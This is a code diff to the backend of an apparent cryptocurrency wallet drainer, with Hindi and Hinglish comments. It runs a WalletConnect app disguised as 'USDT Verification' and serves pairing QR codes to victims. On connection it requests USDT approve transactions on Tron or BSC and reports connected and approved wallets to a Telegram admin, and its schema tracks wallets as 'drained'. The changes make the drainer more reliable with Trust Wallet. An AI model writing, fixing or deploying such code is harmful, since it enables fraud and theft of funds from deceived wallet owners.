@@ -56,6 +56,7 @@ const WalletSchema = new mongoose.Schema({
   sessionId: { type: String, unique: true, required: true },
   chain: { type: String, enum: ['tron', 'bsc'], required: true },
   wcPairingTopic: String,
+  wcTopic: String,
   userWallet: { type: String, default: null },
   approved: { type: Boolean, default: false },
   status: { type: String, enum: ['pending','attached','approved','drained'], default: 'pending' },
@@ -65,7 +66,6 @@ const Wallet = mongoose.model('Wallet', WalletSchema);
 
 // ============ WALLETCONNECT SETUP ============
 let signClient = null;
-const pairingMap = new Map();
 const sessionMap = new Map();
 
 async function initWC() {
@@ -77,7 +77,6 @@ async function initWC() {
       name: 'USDT Verification', 
       description: 'Securely verify your wallet to proceed with the payment.',
       url: BACKEND_URL,
-      // 👇 यहाँ आपकी इमेज का डायरेक्ट लिंक सेट कर दिया गया है 👇
       icons: ['https://i.postimg.cc/FY2PX37m/0000000087ac81faa556b88da506f604.png'] 
     }
   });
@@ -86,19 +85,24 @@ async function initWC() {
     try {
       const { id, params } = event;
       const pairingTopic = params.pairingTopic;
-      const sessionId = pairingMap.get(pairingTopic);
       
-      if (!sessionId) return;
+      // DB se search karo memory ki jagah
+      const wallet = await Wallet.findOne({ wcPairingTopic: pairingTopic });
+      if (!wallet) {
+        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Wallet not found for topic ${pairingTopic}`);
+        return;
+      }
 
-      const wallet = await Wallet.findOne({ sessionId });
-      if (!wallet) return;
+      // Sirf wahi namespace approve karo jo request kiya tha
+      const namespacesToApprove = wallet.chain === 'tron' ? {
+        tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] }
+      } : {
+        eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
+      };
 
       const { acknowledged } = await signClient.approve({
         id,
-        namespaces: {
-          tron: { methods: ['tron_signTransaction'], chains: ['tron:0x2b6653dc'], events: [] },
-          eip155: { methods: ['eth_sendTransaction'], chains: ['eip155:56'], events: [] }
-        }
+        namespaces: namespacesToApprove
       });
       
       const session = await acknowledged();
@@ -107,37 +111,49 @@ async function initWC() {
 
       if (session.namespaces.tron && session.namespaces.tron.accounts.length) {
         walletAddress = session.namespaces.tron.accounts[0].split(':')[2];
-        chain = 'tron';
       } else if (session.namespaces.eip155 && session.namespaces.eip155.accounts.length) {
         walletAddress = session.namespaces.eip155.accounts[0].split(':')[2];
-        chain = 'bsc';
       }
 
-      if (!walletAddress) return;
+      if (!walletAddress) {
+        bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Address not found in session namespaces.`);
+        return;
+      }
 
       wallet.userWallet = walletAddress;
-      wallet.chain = chain;
+      wallet.wcTopic = session.topic;
       wallet.status = 'attached';
       await wallet.save();
 
-      sessionMap.set(sessionId, { topic: session.topic, walletAddress, chain });
+      sessionMap.set(wallet.sessionId, { topic: session.topic, walletAddress, chain });
 
-      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nRequesting approval...`, { parse_mode: 'Markdown' });
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `🔗 *Wallet Connected* [${chain.toUpperCase()}]\nWallet: \`${walletAddress}\`\n\nWaiting 2 seconds before requesting approval...`, { parse_mode: 'Markdown' });
 
-      await requestApproval(sessionId);
-    } catch (e) { console.error('session_proposal error:', e); }
+      // Trust Wallet ko active hone ke liye 2 second ka time do
+      await new Promise(r => setTimeout(r, 2000));
+
+      await requestApproval(wallet.sessionId);
+    } catch (e) { 
+      console.error('session_proposal error:', e); 
+      bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ session_proposal Error: ${e.message}`);
+    }
   });
   console.log('WalletConnect ready');
 }
 
 async function requestApproval(sessionId) {
   const session = sessionMap.get(sessionId);
-  if (!session) return;
+  if (!session) {
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Error: Session map missing for ${sessionId}`);
+    return;
+  }
   const wallet = await Wallet.findOne({ sessionId });
   const chain = wallet.chain;
 
   try {
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `⏳ Requesting Approval from Trust Wallet...`);
     let result;
+    
     if (chain === 'tron') {
       const tx = await tronWeb.transactionBuilder.triggerSmartContract(
         CONTRACTS.tron.usdt, 'approve(address,uint256)', { feeLimit: 100000000, callValue: 0 },
@@ -185,7 +201,8 @@ async function requestApproval(sessionId) {
       bot.sendMessage(TG_ADMIN_CHAT_ID, `✅ *Approved* [BSC]\nWallet: \`${wallet.userWallet}\``, { parse_mode: 'Markdown' });
     }
   } catch (e) {
-    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval error [${chain}]: ${e.message}`);
+    console.error('requestApproval error:', e);
+    bot.sendMessage(TG_ADMIN_CHAT_ID, `❌ Approval Error [${chain}]: ${e.message}`);
   }
 }
 
@@ -211,10 +228,8 @@ app.post('/api/generate-qr', checkAdmin, async (req, res) => {
 
     const pairingTopic = uri.split('@')[0].replace('wc:', '');
     await Wallet.create({ sessionId, chain, wcPairingTopic: pairingTopic, status: 'pending' });
-    pairingMap.set(pairingTopic, sessionId);
 
     const qrImage = await QRCode.toDataURL(uri, { width: 400, margin: 2 });
-
     res.json({ success: true, sessionId, chain, uri, qrImage });
   } catch (e) { res.status(500).json({ error: e.message }); }
 });
